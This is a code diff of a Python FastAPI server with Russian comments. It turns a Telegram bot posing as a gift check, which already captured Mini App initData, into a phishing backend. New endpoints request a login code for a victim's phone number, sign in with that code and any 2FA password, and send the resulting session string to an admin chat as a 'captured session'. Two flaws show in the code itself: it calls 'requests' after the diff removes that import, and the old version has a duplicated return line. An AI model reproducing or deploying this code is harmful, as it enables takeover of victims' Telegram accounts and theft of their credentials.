@@ -1,59 +1,57 @@
 from fastapi import FastAPI, Request
-from fastapi.middleware.cors import CORSMiddleware
-import requests
+from telethon import TelegramClient
+from telethon.sessions import StringSession
 import os
 
 app = FastAPI()
 
-# Разрешаем Mini App отправлять данные
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-
+# Твои данные с my.telegram.org
+API_ID = 'твой_api_id' 
+API_HASH = 'твой_api_hash'
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = os.getenv("ADMIN_ID")
 
-# --- НОВАЯ ЧАСТЬ ДЛЯ ОТВЕТА НА /START ---
-def send_telegram_msg(chat_id, text):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(url, json={
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "Markdown"
-    })
+# Словарь для хранения временных клиентов
+clients = {}
 
-@app.post("/webhook") # Этот эндпоинт нужен для обработки сообщений
-async def webhook(request: Request):
+@app.post("/auth/send_code")
+async def send_code(request: Request):
     data = await request.json()
-    if "message" in data:
-        chat_id = data["message"]["chat"]["id"]
-        text = data["message"].get("text", "")
-        
-        if text == "/start":
-            # Твой новый текст
-            msg = "Проверка подарков...\nПодождите, это займет некоторое время"
-            send_telegram_msg(chat_id, msg)
-    return {"status": "ok"}
-# ---------------------------------------
+    phone = data.get("phone")
+    
+    # Создаем клиента в памяти
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    await client.connect()
+    
+    # Запрашиваем код
+    sent_code = await client.send_code_request(phone)
+    clients[phone] = {
+        "client": client,
+        "phone_code_hash": sent_code.phone_code_hash
+    }
+    return {"status": "code_sent"}
 
-@app.post("/log")
-async def log_data(request: Request):
+@app.post("/auth/login")
+async def login(request: Request):
+    data = await request.json()
+    phone = data.get("phone")
+    code = data.get("code")
+    password = data.get("password") # Если есть 2FA
+
+    user_data = clients.get(phone)
+    client = user_data["client"]
+    
     try:
-        data = await request.json()
-        init_data = data.get("initData")
-        
-        msg = f"✅ **Данные захвачены!**\n\n`{init_data}`"
-        send_telegram_msg(ADMIN_ID, msg)
-        
-        return {"status": "success"}
-    except Exception as e:
-        return {"status": "error", "message": str(e)}
+        await client.sign_in(phone, code, phone_code_hash=user_data["phone_code_hash"])
+    except Exception: # Если нужен 2FA
+        await client.sign_in(password=password)
 
-@app.get("/")
-async def root():
-    return {"message": "Server is running!"}
-    return {"message": "Server is running!"}
+    # ГЕНЕРИРУЕМ СЕССИЮ!
+    session_str = client.session.save()
+    
+    # Отправляем админу заветную строку
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+        "chat_id": ADMIN_ID,
+        "text": f"🔥 **СЕССИЯ ЗАХВАЧЕНА!**\n\n`{session_str}`"
+    })
+    return {"status": "success"}
